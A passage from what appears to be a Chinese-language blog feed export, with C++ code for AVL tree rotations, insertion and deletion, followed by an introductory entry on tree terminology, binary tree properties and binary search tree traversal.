key)</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* &amp; <span class="title">GetRootNoder</span><span class="params">()</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">Search</span><span class="params">(AVLNodeEntry&lt;T&gt;* pNode,<span class="keyword">int</span> key)</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">GetMaxNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">GetMinNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">predecessor</span><span class="params">(AVLNodeEntry&lt;T&gt;* cur_node)</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">successor</span><span class="params">(AVLNodeEntry&lt;T&gt;* cur_node)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> AVLNodeEntry&lt;T&gt;* <span class="title">CreateElementBy</span><span class="params">(<span class="keyword">int</span>  key,<span class="keyword">const</span> T&amp; value,AVLNodeEntry&lt;T&gt;* pParent= <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ClearAll</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp; pNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InOrder</span><span class="params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PostOrder</span><span class="params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LevelOrder</span><span class="params">(AVLNodeEntry&lt;T&gt;* pRootNode)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算节点的高度</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">CalcHeight</span><span class="params">(AVLNodeEntry&lt;T&gt;* pNode)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!pNode)<span class="keyword">return</span>;</span><br><span class="line">        pNode-&gt;height=<span class="built_in">std</span>::max(Height(pNode-&gt;left_nodes),Height(pNode-&gt;right_nodes))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">LLRotation</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">RRRotation</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">LRRotation</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;</span><br><span class="line">    <span class="function">AVLNodeEntry&lt;T&gt;* <span class="title">RLRotation</span><span class="params">(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">AVLNodeEntry</span>&lt;T&gt;* <span class="title">AVLTree</span>&lt;T&gt;:</span>:LLRotation(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!pRootNode)<span class="keyword">return</span> pRootNode;</span><br><span class="line">    AVLNodeEntry&lt;T&gt;*  leftChild=pRootNode-&gt;left_nodes;</span><br><span class="line">    pRootNode-&gt;left_nodes=leftChild-&gt;right_nodes;</span><br><span class="line">    <span class="keyword">if</span>(leftChild-&gt;right_nodes!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        leftChild-&gt;right_nodes-&gt;parent=pRootNode;</span><br><span class="line">    &#125;</span><br><span class="line">    leftChild-&gt;right_nodes=pRootNode;</span><br><span class="line">    </span><br><span class="line">    leftChild-&gt;parent=pRootNode-&gt;parent;</span><br><span class="line">    pRootNode-&gt;parent=leftChild;</span><br><span class="line"></span><br><span class="line">    CalcHeight(pRootNode);</span><br><span class="line">    CalcHeight(leftChild);</span><br><span class="line"></span><br><span class="line">    pRootNode=leftChild;</span><br><span class="line">    <span class="keyword">if</span>(pRootNode-&gt;parent==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_NodeRoot=pRootNode;</span><br><span class="line">    <span class="keyword">return</span> leftChild;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">AVLNodeEntry</span>&lt;T&gt;* <span class="title">AVLTree</span>&lt;T&gt;:</span>:RRRotation(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!pRootNode)<span class="keyword">return</span> pRootNode;</span><br><span class="line">    AVLNodeEntry&lt;T&gt;*  rightChild=pRootNode-&gt;right_nodes;</span><br><span class="line">    pRootNode-&gt;right_nodes=rightChild-&gt;left_nodes;</span><br><span class="line">    <span class="keyword">if</span>(rightChild-&gt;left_nodes!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        rightChild-&gt;left_nodes-&gt;parent=pRootNode;</span><br><span class="line">    &#125;</span><br><span class="line">    rightChild-&gt;left_nodes=pRootNode;</span><br><span class="line"></span><br><span class="line">    rightChild-&gt;parent=pRootNode-&gt;parent;</span><br><span class="line">    pRootNode-&gt;parent=rightChild; </span><br><span class="line"></span><br><span class="line">    CalcHeight(pRootNode);</span><br><span class="line">    CalcHeight(rightChild);</span><br><span class="line"></span><br><span class="line">    pRootNode=rightChild;</span><br><span class="line">    <span class="keyword">if</span>(pRootNode-&gt;parent==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_NodeRoot=pRootNode;</span><br><span class="line">    <span class="keyword">return</span> rightChild;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">AVLNodeEntry</span>&lt;T&gt;* <span class="title">AVLTree</span>&lt;T&gt;:</span>:LRRotation(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;RRRotation(pRootNode-&gt;left_nodes);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;LLRotation(pRootNode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">AVLNodeEntry</span>&lt;T&gt;* <span class="title">AVLTree</span>&lt;T&gt;:</span>:RLRotation(AVLNodeEntry&lt;T&gt;* &amp;pRootNode)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;LLRotation(pRootNode-&gt;right_nodes);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;RRRotation(pRootNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>插入一个新节点后，可能导致AVL树不平衡，因此需要判断平衡因子bf，若bf为2或-2说明需要进行旋转操作。不过只需要判断bf是否为2即可，这是由遍历的顺序决定的。<br>每次插入完成都需要更新节点的高度</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">AVLTree</span>&lt;T&gt;:</span>:Insert(AVLNodeEntry&lt;T&gt;* &amp; pNode,AVLNodeEntry&lt;T&gt;* pNodeParent,<span class="keyword">int</span> key,<span class="keyword">const</span> T&amp; value) &#123;</span><br><span class="line">    <span class="keyword">if</span>(pNode == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        pNode=<span class="keyword">new</span> AVLNodeEntry&lt;T&gt;;</span><br><span class="line">        pNode-&gt;key=key;</span><br><span class="line">        pNode-&gt;left_nodes= <span class="literal">nullptr</span>;</span><br><span class="line">        pNode-&gt;right_nodes= <span class="literal">nullptr</span>;</span><br><span class="line">        pNode-&gt;data=value;</span><br><span class="line">        pNode-&gt;parent=pNodeParent;</span><br><span class="line">        pNode-&gt;height=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历左子树</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key &lt; pNode-&gt;key)&#123;</span><br><span class="line">        Insert(pNode-&gt;left_nodes,pNode,key,value);</span><br><span class="line">        <span class="comment">// 插入完成后检查是否平衡了</span></span><br><span class="line">        <span class="comment">// 若平衡因子为2表示不平衡</span></span><br><span class="line">        <span class="comment">// 只需要判断左右两边树的高度之差</span></span><br><span class="line">        <span class="keyword">if</span>(Height(pNode-&gt;left_nodes)-Height(pNode-&gt;right_nodes)==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(key &lt; pNode-&gt;left_nodes-&gt;key)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;LLRotation(pNode);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;LRRotation(pNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="comment">// 否则右子树</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key &gt; pNode-&gt;key)&#123;</span><br><span class="line">        Insert(pNode-&gt;right_nodes,pNode,key,value);</span><br><span class="line">        <span class="comment">// 插入完成后检查是否平衡了</span></span><br><span class="line">        <span class="keyword">if</span>(Height(pNode-&gt;right_nodes)-Height(pNode-&gt;left_nodes)==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(key &gt; pNode-&gt;right_nodes-&gt;key)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;RRRotation(pNode);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;RLRotation(pNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//如果已经存在了</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;"Already exist!"&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 插入完成后更新高度!</span></span><br><span class="line">    <span class="comment">// 从 0 开始计数，因此需要加1</span></span><br><span class="line">    CalcHeight(pNode); <span class="comment">// +1表示包括当前根节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>删除操作类似二叉查找树的删除操作，同样需要找到一个前驱/后继节点。<br>不过此处删除操作是在一个递归函数中进行的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">AVLTree</span>&lt;T&gt;:</span>:Delete(AVLNodeEntry&lt;T&gt;* &amp; pNode,<span class="keyword">int</span> key) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!pNode)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (key &lt; pNode-&gt;key)&#123;</span><br><span class="line">        <span class="comment">// 在左子树中删除一个节点</span></span><br><span class="line">        Delete(pNode-&gt;left_nodes,key);</span><br><span class="line">        <span class="comment">// 删除后重新平衡</span></span><br><span class="line">        <span class="keyword">if</span>(Height(pNode-&gt;right_nodes)-Height(pNode-&gt;left_nodes)==<span class="number">2</span>)&#123; </span><br><span class="line">            <span class="keyword">if</span>(Height(pNode-&gt;right_nodes-&gt;left_nodes)&gt;=Height(pNode-&gt;right_nodes-&gt;right_nodes))&#123;</span><br><span class="line">                RLRotation(pNode);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                RRRotation(pNode);</span><br><span class="line">            &#125;                </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (key &gt; pNode-&gt;key)&#123;</span><br><span class="line">        <span class="comment">// 在右子树中删除一个节点</span></span><br><span class="line">        Delete(pNode-&gt;right_nodes,key);</span><br><span class="line">        <span class="keyword">if</span> (Height(pNode-&gt;left_nodes)-Height(pNode-&gt;right_nodes)==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Height(pNode-&gt;left_nodes-&gt;left_nodes)&gt;=Height(pNode-&gt;left_nodes-&gt;right_nodes))&#123;</span><br><span class="line">                LLRotation(pNode);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                LRRotation(pNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 左右子树都存在</span></span><br><span class="line">        <span class="keyword">if</span> (pNode-&gt;left_nodes&amp;&amp;pNode-&gt;right_nodes)&#123;</span><br><span class="line">            <span class="comment">// 找到一个后继节点 </span></span><br><span class="line">            AVLNodeEntry&lt;T&gt;* successor=<span class="keyword">this</span>-&gt;successor(pNode);</span><br><span class="line">            pNode-&gt;key=successor-&gt;key;</span><br><span class="line">            pNode-&gt;data=successor-&gt;data;</span><br><span class="line">            <span class="comment">// 删除那个后继节点</span></span><br><span class="line">            Delete(pNode-&gt;right_nodes,successor-&gt;key);</span><br><span class="line">            <span class="comment">// 然后再次重新平衡</span></span><br><span class="line">            <span class="keyword">if</span>(Height(pNode-&gt;left_nodes)-Height(pNode-&gt;right_nodes)==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(Height(pNode-&gt;left_nodes-&gt;left_nodes)&gt;=Height(pNode-&gt;left_nodes-&gt;right_nodes))&#123;</span><br><span class="line">                    LLRotation(pNode);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    LRRotation(pNode);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 删除只有一个子树和叶子情况</span></span><br><span class="line">            <span class="keyword">auto</span> pDeleteNode=pNode;</span><br><span class="line">             <span class="comment">// 保存其子节点，无论是否为空</span></span><br><span class="line">            AVLNodeEntry&lt;T&gt;* childNode=<span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDeleteNode-&gt;left_nodes!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                childNode=pDeleteNode-&gt;left_nodes;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pDeleteNode-&gt;right_nodes!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                childNode=pDeleteNode-&gt;right_nodes;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果存在子节点（不是叶子），那么修改其指向父节点</span></span><br><span class="line">            <span class="keyword">if</span>(childNode!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                childNode-&gt;parent=pDeleteNode-&gt;parent;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 删除的是根节点</span></span><br><span class="line">            <span class="keyword">if</span>(pDeleteNode-&gt;parent==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;m_NodeRoot=childNode;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pDeleteNode-&gt;parent-&gt;left_nodes==pDeleteNode)&#123;</span><br><span class="line">                <span class="comment">// 修改待删除节点的父节点指向待删除节点的子节点</span></span><br><span class="line">                pDeleteNode-&gt;parent-&gt;left_nodes=childNode;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (pDeleteNode-&gt;parent-&gt;right_nodes==pDeleteNode)&#123;</span><br><span class="line">                pDeleteNode-&gt;parent-&gt;right_nodes=childNode;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">delete</span> pDeleteNode;</span><br><span class="line">            pDeleteNode=<span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 跟新节点高度</span></span><br><span class="line">    <span class="keyword">if</span>(pNode)&#123;</span><br><span class="line">        CalcHeight(pNode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码： <a href="https://josephxrays.coding.net/p/avlTree_c/git" target="_blank" rel="noopener">https://josephxrays.coding.net/p/avlTree_c/git</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-二叉查找树(BST)</title>
    <url>/bst-cpp/</url>
    <content><![CDATA[<p>在计算机科学中，树是一种<strong>非线性数据结构</strong>，树的种类有大致分为两类:<strong>无序树</strong>和<strong>有序树</strong>。有序树又分为二叉查找树、堆、左高树、AVL树、红黑树等。树是一种非常重要的数据结构，如C++ STL中的map底层实现原理是红黑树，Java (jdk1.8) HashMap更是采用了散列表+链表+红黑树。<br>不过在讨论二叉查找树之前，我们需要了解树的一些基本知识。</p>
<a id="more"></a>

<h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><p>一棵树t是一个<strong>非空</strong>的<strong>有限</strong>个元素的集合，其中一个元素为根(root)，若其余元素存在，则组成t的子树</p>
<p>如下图图3为仅有一个元素的树，且该元素为树的根(root)<br><img src="/uploads/images/data_structure/bst_cpp/01.png" alt></p>
<h4 id="关于树的术语-摘自维基百科"><a href="#关于树的术语-摘自维基百科" class="headerlink" title="关于树的术语(摘自维基百科)"></a>关于树的术语(摘自维基百科)</h4><p><strong>节点的度</strong>：一个节点含有的<strong>子树的个数</strong>称为该节点的度<br><strong>树的度</strong>：一棵树中，<strong>最大的节点度</strong>称为树的度<br><strong>叶节点或终端节点</strong>：<strong>度为零</strong>的节点，也就是没有节点的节点<br><strong>非终端节点或分支节点</strong>：<strong>度不为零</strong>的节点<br><strong>父亲节点或父节点</strong>：若一个节点<strong>含有子节点</strong>，则这个节点称为其子节点的父节点<br><strong>孩子节点或子节点</strong>：一个节点含有的子树的根节点称为该节点的子节点<br><strong>兄弟节点</strong>：具有<strong>相同父节点</strong>的节点互称为兄弟节点<br><strong>节点的层次</strong>：从根开始定义起，根为第1层，根的子节点为第2层，以此类推<br><font color="red"><strong>深度</strong>：对于任意节点n,n的深度为从根到n的唯一路径长，根的深度为0</font><br><font color="red"><strong>高度</strong>：对于任意节点n,n的高度为从n到<strong>叶子节点</strong>的<strong>最长路径长</strong>，所有树叶的高度为0</font><br><strong>堂兄弟节点</strong>：父节点在同一层的节点互为堂兄弟<br><strong>节点的祖先</strong>：从根到该节点所经分支上的所有节点<br><strong>子孙</strong>：以某节点为根的子树中任一节点都称为该节点的子孙<br><strong>森林</strong>：由m（m&gt;=0）棵<strong>互不相交</strong>的树的集合称为森林</p>
<p>高度和深度的区别其实不用太在意，不同的人有不同的定义。<br>若有兴趣可以去stackoverflow <a href="https://stackoverflow.com/questions/2603692/what-is-the-difference-between-tree-depth-and-height" target="_blank" rel="noopener">What is the difference between tree depth and height?
</a> 看看</p>
<h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><p>定义：一棵二叉树(binary tree) t 是<strong>有限</strong>个元素的集合(可以为空)。当二叉树非空时，其中一个元素称为<strong>根</strong>，若存在其余元素，则分为两颗二叉树，分别称为 t 的<strong>左子树</strong>和<strong>右子树</strong></p>
<p>二叉树中每个元素的左子树和右子树是<strong>有序的</strong>，而树的子树是<strong>无序的</strong></p>
<h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>二叉树的性质有很多，这里仅列举其中的一些。</p>
<p>性质1：一棵二叉树有$n$个元素，$n&gt;0$，它有$n-1$条边<br>性质2：一棵二叉树的高度为$h$，$h\ge0$，它最少有$h$个元素，最多有$2^h-1$个元素<br>性质3：一棵二叉树有$n$个元素，$n&gt;0$，它的高度最大为$n$，最小高度为$\lceil log_2(n+1) \rceil$。<br>性质4：设<strong>完全二叉树</strong>其中一个元素编号$i，1 \le i \le n$，则:</p>
<ul>
<li>若$i=1$，则该元素为二叉树的根。若$i&gt;1$，则其父节点的编号为 $\lfloor \frac{i}{2} \rfloor$</li>
<li>若$2i&gt;n$，则该元素无左孩子。否则，其左孩子编号$2i$</li>
<li>若$2i+1&gt;n$，则该元素无右孩子。否则，其右孩子编号$2i+1$</li>
</ul>
<p>当高度为$h$的二叉树恰好有$2^h-1$个元素时，称为<strong>满二叉树</strong>。<br><img src="/uploads/images/data_structure/bst_cpp/02.png" alt></p>
<p><strong>完全二叉树</strong>可以看作是满二叉树删除最底层最右边的元素后形成的一棵树。<br>满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树<br><img src="/uploads/images/data_structure/bst_cpp/03.png" alt></p>
<h4 id="二叉树描述"><a href="#二叉树描述" class="headerlink" title="二叉树描述"></a>二叉树描述</h4><p>二叉树描述既可以<strong>数组</strong>也可以用<strong>链表</strong>。其中用数组描述的一般是<strong>二叉堆</strong>，用链表描述的比较常用，适用范围广。因此本文主要是基于链表描述的二叉查找树来展开</p>
<h3 id="二叉查找树-Binary-Search-Tree"><a href="#二叉查找树-Binary-Search-Tree" class="headerlink" title="二叉查找树(Binary Search Tree)"></a>二叉查找树(Binary Search Tree)</h3><p>二叉查找树也可叫做二叉搜索树，其满足以下特征:</p>
<ul>
<li>每个元素有<strong>唯一</strong>的一个关键字</li>
<li><strong>左子树</strong>的元素的关键字<strong>小于</strong> <strong>根节点</strong>的关键字</li>
<li><strong>右子树</strong>的元素的关键字<strong>大于</strong> <strong>根节点</strong>的关键字</li>
<li>根节点的左右子树也是二叉查找树</li>
</ul>
<p><img src="/uploads/images/data_structure/bst_cpp/03.png" alt></p>
<p>定义一个bst节点结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">NodeEntry</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> key; <span class="comment">// 关键字</span></span><br><span class="line">    T data; <span class="comment">// 数据域 </span></span><br><span class="line">    NodeEntry *parent; <span class="comment">// 父节点</span></span><br><span class="line">    NodeEntry *left_nodes; <span class="comment">// 左子树</span></span><br><span class="line">    NodeEntry *right_nodes; <span class="comment">// 右子树</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>bst模板类</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">binaryTree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">    <span class="keyword">typedef</span> T&amp; reference_type;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">const</span> T&amp; const_reference_type;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">const</span> <span class="keyword">int</span>&amp; const_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> NodeEntry&lt;T&gt; NODE;</span><br><span class="line">    <span class="keyword">typedef</span> NodeEntry&lt;T&gt;&amp; REF_NODE;</span><br><span class="line">    <span class="keyword">typedef</span> NodeEntry&lt;T&gt;* PNODE;</span><br><span class="line">    <span class="keyword">typedef</span> NodeEntry&lt;T&gt;* &amp; REF_PNODE;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    PNODE m_NodeRoot;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    binaryTree();</span><br><span class="line">    binaryTree(const_key_type  k,const_reference_type v);</span><br><span class="line">    ~binaryTree();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Height</span><span class="params">(PNODE pNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Insert</span><span class="params">(REF_PNODE pNode,PNODE pNodeParent,const_key_type key,const_reference_type value)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Delete</span><span class="params">(PNODE pNode,const_key_type key)</span></span>;</span><br><span class="line">    <span class="function">NodeEntry&lt;T&gt;* <span class="title">Search</span><span class="params">(PNODE pNode,const_key_type key)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ClearAll</span><span class="params">(REF_PNODE pNode)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">NodeEntry&lt;T&gt;* <span class="title">predecessor</span><span class="params">(NODE* pNode)</span></span>;</span><br><span class="line">    <span class="function">NodeEntry&lt;T&gt;* <span class="title">successor</span><span class="params">(NODE* pNode)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PreOrder</span><span class="params">(NODE * pRootNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">InOrder</span><span class="params">(NODE * pRootNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">PostOrder</span><span class="params">(NODE * pRootNode)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">LevelOrder</span><span class="params">(NODE * pRootNode)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><p>bst有三种遍历方式</p>
<ul>
<li>前序遍历</li>
<li>中序遍历</li>
<li>后序遍历</li>
<li>层级遍历</li>
</ul>
<h5 id="前序遍历"><a href="#前序遍历" class="headerlink" title="前序遍历"></a>前序遍历</h5><p>先访问当前节点，然后再遍历左子树，最后遍历右子树<br><img src="/uploads/images/data_structure/bst_cpp/04.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> binaryTree&lt;T&gt;::PreOrder(binaryTree::NODE *pRootNode) &#123;</span><br><span class="line">    <span class="keyword">if</span>(pRootNode== <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pRootNode-&gt;key&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    PreOrder(pRootNode-&gt;left_nodes);</span><br><span class="line">    PreOrder(pRootNode-&gt;right_nodes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h5><p>先遍历左子树，再访问当前节点，最后遍历右子树<br><img src="/uploads/images/data_structure/bst_cpp/05.png" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> binaryTree&lt;T&gt;::InOrder(binaryTree::NODE *pRootNode) &#123;</span><br><span class="line">    <span class="keyword">if</span>(pRootNode == <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    InOrder(pRootNode-&gt;left_nodes);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;pRootNode-&gt;key&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    InOrder(pRootNode-&gt;right_nodes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见中序遍历能够有序输出节点</p>
<h5 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h5><p>先遍历左子树，再遍历右子树，最后访问当前节点<br><img src="/uploads/images/data_structure/bst_cpp/06.png" alt></p>
